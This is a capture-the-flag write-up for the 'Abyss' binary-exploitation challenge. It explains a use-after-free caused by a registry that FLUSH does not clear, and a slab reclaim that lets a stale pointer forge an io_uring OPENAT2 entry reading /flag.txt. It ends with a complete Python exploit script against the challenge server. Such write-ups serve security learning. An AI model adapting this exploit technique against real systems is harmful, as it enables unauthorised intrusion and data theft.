# Abyss — PWN Challenge Writeup

**CTF:** ApoorvCTF  
**Challenge:** Abyss  
**Category:** PWN  
**Author:** shura356  
**Flag:** `apoorvctf{th1s_4by55_truly_d03s_5t4r3_b4ck}`

---

## Overview

We're given a stripped-but-symbol-bearing x86-64 PIE ELF binary (`abyss`) that serves as an interactive submarine-themed command interface over TCP. The binary uses **io_uring** for async I/O and **seccomp** to sandbox itself. A dedicated "benthic" thread can open and read `/flag.txt` — but only through leviathan objects and io_uring SQEs. The goal is to exploit a **use-after-free** in the slab allocator to forge an io_uring submission queue entry that reads the flag.

## Binary Architecture

The binary runs three threads:

| Thread | Role |
|---|---|
| **main** | Parses user commands, manages dive/leviathan registries |
| **mesopelagic** | Receives flush requests via pipe, walks the request stack, frees dive objects after a futex-based delay |
| **benthic** | Sets up io_uring, waits for wake signals, submits SQEs from leviathan objects, and can read `/flag.txt` |

### Key Data Structures

- **dive objects** (0x60 bytes each, 16-entry slab at `dive_slab`): Contain a depth field, a 0x40-byte data buffer at offset +0x08, a timestamp, a next pointer at +0x50, and a canary at +0x58.
- **leviathan objects** (0x60 bytes each, 16-entry slab at `levi_slab`): Contain an ID, a flags field at +0x04, a 0x40-byte data region at +0x08 (used as an io_uring SQE), and similar metadata.
- **Free lists** (`dive_free_head`, `levi_free_head`): XOR-encoded singly linked lists using `g_slab_secret` (8-byte random value from `getrandom`).
- **Registries** (`g_dive_reg[16]`, `g_levi_reg[24]`): Pointer arrays holding active objects by slot ID.

### Commands

| Command | Description |
|---|---|
| `DIVE <depth>` | Allocates a dive object from the free list, registers it, pushes it onto `g_request_stack` |
| `DESCEND <id> <offset> [hex_data]` | Writes hex-decoded data into dive object's buffer at given offset |
| `WRITE <id> <offset> [hex_data]` | Same as DESCEND but with different offset validation |
| `POP` | Pops a dive from `g_request_stack`, unregisters and frees it |
| `FLUSH` | Signals the mesopelagic thread to walk and free the entire request stack |
| `STATUS <id>` | Dumps full dive object metadata including the raw buffer as hex |
| `BEACON <slot>` | Allocates a leviathan object into `g_levi_reg[slot]` |
| `ABYSS <slot>` | Triggers the benthic thread to submit the leviathan's data as an io_uring SQE |
| `ECHO <text>` | Echoes back text |
| `HELP` | Lists commands |
| `QUIT` | Exits |

## Vulnerability: Use-After-Free via FLUSH

The critical bug is in the **FLUSH** command path:

1. `FLUSH` sends a message to the mesopelagic thread via `g_cmd_pipe`.
2. The mesopelagic thread pops all dive objects from `g_request_stack`, waits ~250ms (futex), then frees them back to `dive_free_head`.
3. **Crucially, the mesopelagic thread only checks if `dive->canary == 0xdeadbeef` to decide whether to free. It does NOT clear the corresponding `g_dive_reg[]` entry.**

This means after FLUSH, `g_dive_reg[id]` still holds a dangling pointer to freed memory. Commands like `DESCEND` and `STATUS` will happily read/write through the stale pointer.

## BEACON Fallback: Cross-Slab Allocation

When `levi_slab` runs out of free entries (16 total), `BEACON` falls back to allocating from `dive_free_head`. This is the pivotal mechanic:

```
if (levi_free_head == NULL) {
    // fallback: steal from dive_free_head
    node = dive_free_head;
    ...
}
```

This means a freed dive object can be **reallocated as a leviathan** — and the stale dive pointer is now aliased to a live leviathan.

## Exploitation Strategy

### Step 1: Exhaust `levi_slab`

Allocate all 16 leviathan slots:

```
BEACON 0
BEACON 1
...
BEACON 15
```

### Step 2: Allocate a Dive Object

```
DIVE 0
```

Response: `DIVING id=0 addr=0x5a8d5ff5a920 depth=0`

The address leaks the dive object's location, giving us the **PIE base**:

```
PIE base = addr - 0x6920
```

### Step 3: Free the Dive via FLUSH

```
FLUSH
```

The dive object is freed back to `dive_free_head`, but `g_dive_reg[0]` still points to it.

### Step 4: Reclaim as Leviathan

```
BEACON 16
```

Since `levi_slab` is exhausted, this allocates from `dive_free_head` — reusing the exact same memory. Response confirms the same address:

```
BEACON id=16 addr=0x5a8d5ff5a920
```

### Step 5: Forge an OPENAT2 SQE via the Stale Dive Pointer

The leviathan's data buffer at offset +0x08 is what gets submitted as an io_uring SQE. We can write to this buffer through the stale `g_dive_reg[0]` using `DESCEND`:

```
DESCEND 0 0 <hex-encoded SQE>
```

The SQE we craft is an `IORING_OP_OPENAT2` (opcode 0x12):

```
Offset  Field          Value
0x00    opcode         0x12 (IORING_OP_OPENAT2)
0x01    flags          0x00
0x02    ioprio         0x0000
0x04    fd             0xFFFFFF9C (-100 = AT_FDCWD)
0x08    off            <addr of open_how struct>  (24 zero bytes somewhere in BSS)
0x10    addr           <addr of "/flag.txt">      (PIE_base + 0x6010 = g_flagname)
0x18    len            24 (sizeof(struct open_how))
```

Key addresses derived from PIE base:
- `g_flagname` at PIE+0x6010 contains the string `/flag.txt`
- `g_dive_reg[1]` at PIE+0x6128 contains zeros (unused slot), serving as a valid zeroed `open_how` struct

### Step 6: Trigger Execution

```
ABYSS 16
```

This wakes the benthic thread, which:
1. Reads the forged SQE from leviathan 16's buffer
2. Submits it to io_uring → `openat2(AT_FDCWD, "/flag.txt", {flags=0, mode=0, resolve=0})`
3. Reaps the CQE → gets a valid fd
4. Detects opcode 0x12 → triggers the flag read path
5. Submits a **READ** SQE on the returned fd into `flag_buf`
6. Writes the result back through the result pipe

The main thread prints:

```
FLAG: apoorvctf{th1s_4by55_truly_d03s_5t4r3_b4ck}
```

## Exploit Script

```python
#!/usr/bin/env python3
import socket, struct, time, re

HOST = "chals1.apoorvctf.xyz"
PORT = 16001

def recvuntil(s, delim=b"\n", timeout=5):
    s.settimeout(timeout)
    data = b""
    while not data.endswith(delim):
        try:
            chunk = s.recv(1)
            if not chunk: break
            data += chunk
        except socket.timeout: break
    return data

def recvall(s, timeout=1):
    s.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except socket.timeout: break
    return data

def sendline(s, line):
    s.sendall(line.encode() + b"\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
recvall(s, timeout=2)

# 1. Exhaust levi_slab
for i in range(16):
    sendline(s, f"BEACON {i}")
    recvuntil(s)

# 2. Allocate dive
sendline(s, "DIVE 0")
resp = recvuntil(s).decode()
m = re.search(r'id=(\d+)\s+addr=0x([0-9a-fA-F]+)', resp)
dive_id = int(m.group(1))
obj_addr = int(m.group(2), 16)
pie_base = obj_addr - 0x6920

# 3. Free via FLUSH (UAF: g_dive_reg[0] not cleared)
sendline(s, "FLUSH")
recvuntil(s)
time.sleep(1.5)

# 4. Reclaim as leviathan
sendline(s, "BEACON 16")
recvuntil(s)

# 5. Forge OPENAT2 SQE through stale dive pointer
flagname_addr = pie_base + 0x6010   # "/flag.txt"
open_how_addr = pie_base + 0x6128   # 24 zero bytes (unused g_dive_reg slot)

sqe  = struct.pack('<BBHi', 0x12, 0, 0, -100)
sqe += struct.pack('<Q', open_how_addr)
sqe += struct.pack('<Q', flagname_addr)
sqe += struct.pack('<I', 24)

sendline(s, f"DESCEND {dive_id} 0 {sqe.hex()}")
recvuntil(s)

# 6. Execute
sendline(s, "ABYSS 16")
result = recvall(s, timeout=5).decode(errors='replace')
print(re.search(r'apoorvctf\{[^}]+\}', result).group(0))
```

## Flag

```
apoorvctf{th1s_4by55_truly_d03s_5t4r3_b4ck}
```
